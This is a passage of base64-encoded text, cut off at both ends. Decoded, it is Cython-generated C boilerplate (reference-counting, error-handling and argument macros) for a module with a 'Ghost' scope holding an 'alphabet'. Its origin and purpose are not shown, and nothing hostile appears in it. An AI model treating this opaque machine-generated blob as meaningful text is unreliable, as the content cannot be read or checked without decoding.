9QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4xIFB5Q3JpdGljYWxTZWN0aW9uX0JlZ2luCiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4yIFB5Q3JpdGljYWxTZWN0aW9uMl9CZWdpbgojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0VuZDEgUHlDcml0aWNhbFNlY3Rpb25fRW5kCiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fRW5kMiBQeUNyaXRpY2FsU2VjdGlvbjJfRW5kCiNlbmRpZgojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG8pIHsKI2RlZmluZSBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpIH0KI2Vsc2UKI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04KI2RlZmluZSBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTiBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTgojZW5kaWYKCgoKCgoKc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdDsKc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcjsKc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcjsKc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcjsKCgpzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0IHsKICBQeU9iamVjdF9IRUFECiAgUHlPYmplY3QgKl9fcHl4X3ZfYWxwaGFiZXQ7Cn07CgoKCnN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgewogIFB5T2JqZWN0X0hFQUQKICBzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0ICpfX3B5eF9vdXRlcl9zY29wZTsKICBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMDsKICBQeU9iamVjdCAqX19weXhfdl9fOwp9OwoKCgpzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByIHsKICBQeU9iamVjdF9IRUFECiAgc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCAqX19weXhfb3V0ZXJfc2NvcGU7CiAgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzA7CiAgUHlPYmplY3QgKl9fcHl4X3ZfXzsKfTsKCgoKc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciB7CiAgUHlPYmplY3RfSEVBRAogIHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3QgKl9fcHl4X291dGVyX3Njb3BlOwogIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wOwogIFB5T2JqZWN0ICpfX3B5eF92X187Cn07CgoKCgoKI2lmbmRlZiBDWVRIT05fUkVGTkFOTlkKICAjZGVmaW5lIENZVEhPTl9SRUZOQU5OWSAwCiNlbmRpZgojaWYgQ1lUSE9OX1JFRk5BTk5ZCiAgdHlwZWRlZiBzdHJ1Y3QgewogICAgdm9pZCAoKklOQ1JFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7CiAgICB2b2lkICgqREVDUkVGKSh2b2lkKiwgUHlPYmplY3QqLCBQeV9zc2l6ZV90KTsKICAgIHZvaWQgKCpHT1RSRUYpKHZvaWQqLCBQeU9iamVjdCosIFB5X3NzaXplX3QpOwogICAgdm9pZCAoKkdJVkVSRUYpKHZvaWQqLCBQeU9iamVjdCosIFB5X3NzaXplX3QpOwogICAgdm9pZCogKCpTZXR1cENvbnRleHQpKGNvbnN0IGNoYXIqLCBQeV9zc2l6ZV90LCBjb25zdCBjaGFyKik7CiAgICB2b2lkICgqRmluaXNoQ29udGV4dCkodm9pZCoqKTsKICB9IF9fUHl4X1JlZk5hbm55QVBJU3RydWN0OwogIHN0YXRpYyBfX1B5eF9SZWZOYW5ueUFQSVN0cnVjdCAqX19QeXhfUmVmTmFubnkgPSBOVUxMOwogIHN0YXRpYyBfX1B5eF9SZWZOYW5ueUFQSVN0cnVjdCAqX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoY29uc3QgY2hhciAqbW9kbmFtZSk7CiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucyB2b2lkICpfX3B5eF9yZWZuYW5ueSA9IE5VTEw7CiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dChuYW1lLCBhY3F1aXJlX2dpbClcCiAgICAgICAgICBpZiAoYWNxdWlyZV9naWwpIHtcCiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9TVEFURSBfX3B5eF9naWxzdGF0ZV9zYXZlID0gUHlHSUxTdGF0ZV9FbnN1cmUoKTtcCiAgICAgICAgICAgICAgX19weXhfcmVmbmFubnkgPSBfX1B5eF9SZWZOYW5ueS0+U2V0dXBDb250ZXh0KChuYW1lKSwgKF9fTElORV9fKSwgKF9fRklMRV9fKSk7XAogICAgICAgICAgICAgIFB5R0lMU3RhdGVfUmVsZWFzZShfX3B5eF9naWxzdGF0ZV9zYXZlKTtcCiAgICAgICAgICB9IGVsc2Uge1wKICAgICAgICAgICAgICBfX3B5eF9yZWZuYW5ueSA9IF9fUHl4X1JlZk5hbm55LT5TZXR1cENvbnRleHQoKG5hbWUpLCAoX19MSU5FX18pLCAoX19GSUxFX18pKTtcCiAgICAgICAgICB9CiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHROb2dpbCgpIHtcCiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9TVEFURSBfX3B5eF9naWxzdGF0ZV9zYXZlID0gUHlHSUxTdGF0ZV9FbnN1cmUoKTtcCiAgICAgICAgICAgICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XAogICAgICAgICAgICAgIFB5R0lMU3RhdGVfUmVsZWFzZShfX3B5eF9naWxzdGF0ZV9zYXZlKTtcCiAgICAgICAgICB9CiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHROb2dpbCgpIHtcCiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9TVEFURSBfX3B5eF9naWxzdGF0ZV9zYXZlID0gUHlHSUxTdGF0ZV9FbnN1cmUoKTtcCiAgICAgICAgICAgICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XAogICAgICAgICAgICAgIFB5R0lMU3RhdGVfUmVsZWFzZShfX3B5eF9naWxzdGF0ZV9zYXZlKTtcCiAgICAgICAgICB9CiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKVwKICAgICAgICAgIF9fUHl4X1JlZk5hbm55LT5GaW5pc2hDb250ZXh0KCZfX3B5eF9yZWZuYW5ueSkKICAjZGVmaW5lIF9fUHl4X0lOQ1JFRihyKSAgX19QeXhfUmVmTmFubnktPklOQ1JFRihfX3B5eF9yZWZuYW5ueSwgKFB5T2JqZWN0ICopKHIpLCAoX19MSU5FX18pKQogICNkZWZpbmUgX19QeXhfREVDUkVGKHIpICBfX1B5eF9SZWZOYW5ueS0+REVDUkVGKF9fcHl4X3JlZm5hbm55LCAoUHlPYmplY3QgKikociksIChfX0xJTkVfXykpCiAgI2RlZmluZSBfX1B5eF9HT1RSRUYocikgIF9fUHl4X1JlZk5hbm55LT5HT1RSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSkKICAjZGVmaW5lIF9fUHl4X0dJVkVSRUYocikgX19QeXhfUmVmTmFubnktPkdJVkVSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSkKICAjZGVmaW5lIF9fUHl4X1hJTkNSRUYocikgIGRvIHsgaWYoKHIpID09IE5VTEwpOyBlbHNlIHtfX1B5eF9JTkNSRUYocik7IH19IHdoaWxlKDApCiAgI2RlZmluZSBfX1B5eF9YREVDUkVGKHIpICBkbyB7IGlmKChyKSA9PSBOVUxMKTsgZWxzZSB7X19QeXhfREVDUkVGKHIpOyB9fSB3aGlsZSgwKQogICNkZWZpbmUgX19QeXhfWEdPVFJFRihyKSAgZG8geyBpZigocikgPT0gTlVMTCk7IGVsc2Uge19fUHl4X0dPVFJFRihyKTsgfX0gd2hpbGUoMCkKICAjZGVmaW5lIF9fUHl4X1hHSVZFUkVGKHIpIGRvIHsgaWYoKHIpID09IE5VTEwpOyBlbHNlIHtfX1B5eF9HSVZFUkVGKHIpO319IHdoaWxlKDApCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogICNkZWZpbmUgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQobmFtZSwgYWNxdWlyZV9naWwpCiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHROb2dpbCgpCiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKQogICNkZWZpbmUgX19QeXhfSU5DUkVGKHIpIFB5X0lOQ1JFRihyKQogICNkZWZpbmUgX19QeXhfREVDUkVGKHIpIFB5X0RFQ1JFRihyKQogICNkZWZpbmUgX19QeXhfR09UUkVGKHIpCiAgI2RlZmluZSBfX1B5eF9HSVZFUkVGKHIpCiAgI2RlZmluZSBfX1B5eF9YSU5DUkVGKHIpIFB5X1hJTkNSRUYocikKICAjZGVmaW5lIF9fUHl4X1hERUNSRUYocikgUHlfWERFQ1JFRihyKQogICNkZWZpbmUgX19QeXhfWEdPVFJFRihyKQogICNkZWZpbmUgX19QeXhfWEdJVkVSRUYocikKI2VuZGlmCiNkZWZpbmUgX19QeXhfUHlfWERFQ1JFRl9TRVQociwgdikgZG8ge1wKICAgICAgICBQeU9iamVjdCAqdG1wID0gKFB5T2JqZWN0ICopIHI7XAogICAgICAgIHIgPSB2OyBQeV9YREVDUkVGKHRtcCk7XAogICAgfSB3aGlsZSAoMCkKI2RlZmluZSBfX1B5eF9YREVDUkVGX1NFVChyLCB2KSBkbyB7XAogICAgICAgIFB5T2JqZWN0ICp0bXAgPSAoUHlPYmplY3QgKikgcjtcCiAgICAgICAgciA9IHY7IF9fUHl4X1hERUNSRUYodG1wKTtcCiAgICB9IHdoaWxlICgwKQojZGVmaW5lIF9fUHl4X0RFQ1JFRl9TRVQociwgdikgZG8ge1wKICAgICAgICBQeU9iamVjdCAqdG1wID0gKFB5T2JqZWN0ICopIHI7XAogICAgICAgIHIgPSB2OyBfX1B5eF9ERUNSRUYodG1wKTtcCiAgICB9IHdoaWxlICgwKQojZGVmaW5lIF9fUHl4X0NMRUFSKHIpICAgIGRvIHsgUHlPYmplY3QqIHRtcCA9ICgoUHlPYmplY3QqKShyKSk7IHIgPSBOVUxMOyBfX1B5eF9ERUNSRUYodG1wKTt9IHdoaWxlKDApCiNkZWZpbmUgX19QeXhfWENMRUFSKHIpICAgZG8geyBpZigocikgIT0gTlVMTCkge1B5T2JqZWN0KiB0bXAgPSAoKFB5T2JqZWN0KikocikpOyByID0gTlVMTDsgX19QeXhfREVDUkVGKHRtcCk7fX0gd2hpbGUoMCkKCgojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiNkZWZpbmUgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhlcnIpIF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXNJblN0YXRlKF9fcHl4X3RzdGF0ZSwgZXJyKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlc0luU3RhdGUoUHlUaHJlYWRTdGF0ZSogdHN0YXRlLCBQeU9iamVjdCogZXJyKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKGVycikgIFB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoZXJyKQojZW5kaWYKCgojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlICBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGU7CiNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24gIF9fcHl4X3RzdGF0ZSA9IF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudDsKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTYKI2RlZmluZSBfX1B5eF9QeUVycl9PY2N1cnJlZCgpICAoX19weXhfdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiAhPSBOVUxMKQojZGVmaW5lIF9fUHl4X1B5RXJyX0N1cnJlbnRFeGNlcHRpb25UeXBlKCkgIChfX3B5eF90c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uID8gKFB5T2JqZWN0KikgUHlfVFlQRShfX3B5eF90c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uKSA6IChQeU9iamVjdCopIE5VTEwpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlFcnJfT2NjdXJyZWQoKSAgKF9fcHl4X3RzdGF0ZS0+Y3VyZXhjX3R5cGUgIT0gTlVMTCkKI2RlZmluZSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpICAoX19weXhfdHN0YXRlLT5jdXJleGNfdHlwZSkKI2VuZGlmCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KI2RlZmluZSBfX1B5eF9QeUVycl9PY2N1cnJlZCgpICAoUHlFcnJfT2NjdXJyZWQoKSAhPSBOVUxMKQojZGVmaW5lIF9fUHl4X1B5RXJyX0N1cnJlbnRFeGNlcHRpb25UeXBlKCkgIFB5RXJyX09jY3VycmVkKCkKI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQojZGVmaW5lIF9fUHl4X1B5RXJyX0NsZWFyKCkgX19QeXhfRXJyUmVzdG9yZShOVUxMLCBOVUxMLCBOVUxMKQojZGVmaW5lIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUodHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUoUHlUaHJlYWRTdGF0ZV9HRVQoKSwgdHlwZSwgdmFsdWUsIHRiKQojZGVmaW5lIF9fUHl4X0VyckZldGNoV2l0aFN0YXRlKHR5cGUsIHZhbHVlLCB0YikgICAgX19QeXhfRXJyRmV0Y2hJblN0YXRlKFB5VGhyZWFkU3RhdGVfR0VUKCksIHR5cGUsIHZhbHVlLCB0YikKI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKQojZGVmaW5lIF9fUHl4X0VyckZldGNoKHR5cGUsIHZhbHVlLCB0YikgICAgX19QeXhfRXJyRmV0Y2hJblN0YXRlKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FcnJGZXRjaEluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDBBNgojZGVmaW5lIF9fUHl4X1B5RXJyX1NldE5vbmUoZXhjKSAoUHlfSU5DUkVGKGV4YyksIF9fUHl4X0VyclJlc3RvcmUoKGV4YyksIE5VTEwsIE5VTEwpKQojZWxzZQojZGVmaW5lIF9fUHl4X1B5RXJyX1NldE5vbmUoZXhjKSBQeUVycl9TZXROb25lKGV4YykKI2VuZGlmCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlFcnJfQ2xlYXIoKSBQeUVycl9DbGVhcigpCiNkZWZpbmUgX19QeXhfUHlFcnJfU2V0Tm9uZShleGMpIFB5RXJyX1NldE5vbmUoZXhjKQojZGVmaW5lIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUodHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpCiNkZWZpbmUgX19QeXhfRXJyRmV0Y2hXaXRoU3RhdGUodHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfRmV0Y2godHlwZSwgdmFsdWUsIHRiKQojZGVmaW5lIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKHRzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpCiNkZWZpbmUgX19QeXhfRXJyRmV0Y2hJblN0YXRlKHRzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfRmV0Y2godHlwZSwgdmFsdWUsIHRiKQojZGVmaW5lIF9fUHl4X0VyclJlc3RvcmUodHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpCiNkZWZpbmUgX19QeXhfRXJyRmV0Y2godHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfRmV0Y2godHlwZSwgdmFsdWUsIHRiKQojZW5kaWYKCgojaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUpOwojZWxzZQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIobyxuKSBQeU9iamVjdF9HZXRBdHRyKG8sbikKI2VuZGlmCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUpOwoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0QnVpbHRpbk5hbWUoUHlPYmplY3QgKm5hbWUpOwoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TGlzdF9Gcm9tQXJyYXkoUHlPYmplY3QgKmNvbnN0ICpzcmMsIFB5X3NzaXplX3Qgbik7CiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIHx8IENZVEhPTl9NRVRIX0ZBU1RDQUxMCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVR1cGxlX0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKTsKI2VuZGlmCgoKI2luY2x1ZGUgPHN0cmluZy5oPgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUJ5dGVzX0VxdWFscyhQeU9iamVjdCogczEsIFB5T2JqZWN0KiBzMiwgaW50IGVxdWFscyk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5VW5pY29kZV9FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpOwoKCiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfVkFSQVJHUyhhcmdzLCBpKSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oYXJncywgaSkKI2VsaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfVkFSQVJHUyhhcmdzLCBpKSBfX1B5eF9OZXdSZWYoX19QeXhfUHlUdXBsZV9HRVRfSVRFTShhcmdzLCBpKSkKI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX1ZBUkFSR1MoYXJncywgaSkgX19QeXhfWE5ld1JlZihQeVR1cGxlX0dldEl0ZW0oYXJncywgaSkpCiNlbmRpZgojZGVmaW5lIF9fUHl4X051bUt3YXJnc19WQVJBUkdTKGt3ZHMpIFB5RGljdF9TaXplKGt3ZHMpCiNkZWZpbmUgX19QeXhfS3dWYWx1ZXNfVkFSQVJHUyhhcmdzLCBuYXJncykgTlVMTAojZGVmaW5lIF9fUHl4X0dldEt3VmFsdWVfVkFSQVJHUyhrdywga3d2YWx1ZXMsIHMpIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyV2l0aEVycm9yKGt3LCBzKQojZGVmaW5lIF9fUHl4X0t3YXJnc0FzRGljdF9WQVJBUkdTKGt3LCBrd3ZhbHVlcykgUHlEaWN0X0NvcHkoa3cpCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoYXJncywgaSkgX19QeXhfTmV3UmVmKGFyZ3NbaV0pCiAgICAjZGVmaW5lIF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChrd2RzKSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKGt3ZHMpCiAgICAjZGVmaW5lIF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKGFyZ3MsIG5hcmdzKSAoKGFyZ3MpICsgKG5hcmdzKSkKICAgIHN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfR2V0S3dWYWx1ZV9GQVNUQ0FMTChQeU9iamVjdCAqa3duYW1lcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcywgUHlPYmplY3QgKnMpOwogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBDWVRIT05fVU5VU0VEIHN0YXRpYyBQeU9iamVjdCAqX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMKFB5T2JqZWN0ICprd25hbWVzLCBQeU9iamVjdCAqY29uc3QgKmt3dmFsdWVzKTsKICAjZWxzZQogICAgI2RlZmluZSBfX1B5eF9Ld2FyZ3NBc0RpY3RfRkFTVENBTEwoa3csIGt3dmFsdWVzKSBfUHlTdGFja19Bc0RpY3Qoa3d2YWx1ZXMsIGt3KQogICNlbmRpZgojZWxzZQogICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfRkFTVENBTEwgX19QeXhfQXJnUmVmX1ZBUkFSR1MKICAgICNkZWZpbmUgX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMIF9fUHl4X051bUt3YXJnc19WQVJBUkdTCiAgICAjZGVmaW5lIF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMIF9fUHl4X0t3VmFsdWVzX1ZBUkFSR1MKICAgICNkZWZpbmUgX19QeXhfR2V0S3dWYWx1ZV9GQVNUQ0FMTCBfX1B5eF9HZXRLd1ZhbHVlX1ZBUkFSR1MKICAgICNkZWZpbmUgX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMIF9fUHl4X0t3YXJnc0FzRGljdF9WQVJBUkdTCiNlbmRpZgojZGVmaW5lIF9fUHl4X0FyZ3NTbGljZV9WQVJBUkdTKGFyZ3MsIHN0YXJ0LCBzdG9wKSBQeVR1cGxlX0dldFNsaWNlKGFyZ3MsIHN0YXJ0LCBzdG9wKQojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgfHwgKENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUykKI2RlZmluZSBfX1B5eF9BcmdzU2xpY2VfRkFTVENBTEwoYXJncywgc3RhcnQsIHN0b3ApIF9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KGFyZ3MgKyBzdGFydCwgc3RvcCAtIHN0YXJ0KQojZWxzZQojZGVmaW5lIF9fUHl4X0FyZ3NTbGljZV9GQVNUQ0FMTChhcmdzLCBzdGFydCwgc3RvcCkgUHlUdXBsZV9HZXRTbGljZShhcmdzLCBzdGFydCwgc3RvcCkKI2VuZGlmCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X2luaXRfdW5pY29kZV9pdGVyYXRpb24oCiAgICBQeU9iamVjdCogdXN0cmluZywgUHlfc3NpemVfdCAqbGVuZ3RoLCB2b2lkKiogZGF0YSwgaW50ICpraW5kKTsKCgojaWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwojZGVmaW5lIF9fUFlYX0RJQ1RfVkVSU0lPTl9JTklUICAoKFBZX1VJTlQ2NF9UKSAtMSkKI2RlZmluZSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpICAoKChQeURpY3RPYmplY3QqKShkaWN0KSktPm1hX3ZlcnNpb25fdGFnKQojZGVmaW5lIF9fUFlYX1VQREFURV9ESUNUX0NBQ0hFKGRpY3QsIHZhbHVlLCBjYWNoZV92YXIsIHZlcnNpb25fdmFyKVwKICAgICh2ZXJzaW9uX3ZhcikgPSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpO1wKICAgIChjYWNoZV92YXIpID0gKHZhbHVlKTsKI2RlZmluZSBfX1BZWF9QWV9ESUNUX0xPT0tVUF9JRl9NT0RJRklFRChWQVIsIERJQ1QsIExPT0tVUCkge1wKICAgIHN0YXRpYyBQWV9VSU5UNjRfVCBfX3B5eF9kaWN0X3ZlcnNpb24gPSAwO1wKICAgIHN0YXRpYyBQeU9iamVjdCAqX19weXhfZGljdF9jYWNoZWRfdmFsdWUgPSBOVUxMO1wKICAgIGlmIChsaWtlbHkoX19QWVhfR0VUX0RJQ1RfVkVSU0lPTihESUNUKSA9PSBfX3B5eF9kaWN0X3ZlcnNpb24pKSB7XAogICAgICAgIChWQVIpID0gX19weXhfZGljdF9jYWNoZWRfdmFsdWU7XAogICAgfSBlbHNlIHtcCiAgICAgICAgKFZBUikgPSBfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSA9IChMT09LVVApO1wKICAgICAgICBfX3B5eF9kaWN0X3ZlcnNpb24gPSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKERJQ1QpO1wKICAgIH1cCn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUFlfVUlOVDY0X1QgX19QeXhfZ2V0X3RwX2RpY3RfdmVyc2lvbihQeU9iamVjdCAqb2JqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgUFlfVUlOVDY0X1QgX19QeXhfZ2V0X29iamVjdF9kaWN0X3ZlcnNpb24oUHlPYmplY3QgKm9iaik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9vYmplY3RfZGljdF92ZXJzaW9uX21hdGNoZXMoUHlPYmplY3QqIG9iaiwgUFlfVUlOVDY0X1QgdHBfZGljdF92ZXJzaW9uLCBQWV9VSU5UNjRfVCBvYmpfZGljdF92ZXJzaW9uKTsKI2Vsc2UKI2RlZmluZSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpICAoMCkKI2RlZmluZSBfX1BZWF9VUERBVEVfRElDVF9DQUNIRShkaWN0LCB2YWx1ZSwgY2FjaGVfdmFyLCB2ZXJzaW9uX3ZhcikKI2RlZmluZSBfX1BZWF9QWV9ESUNUX0xPT0tVUF9JRl9NT0RJRklFRChWQVIsIERJQ1QsIExPT0tVUCkgIChWQVIpID0gKExPT0tVUCk7CiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMKI2RlZmluZSBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKHZhciwgbmFtZSkgIGRvIHtcCiAgICBzdGF0aWMgUFlfVUlOVDY0X1QgX19weXhfZGljdF92ZXJzaW9uID0gMDtc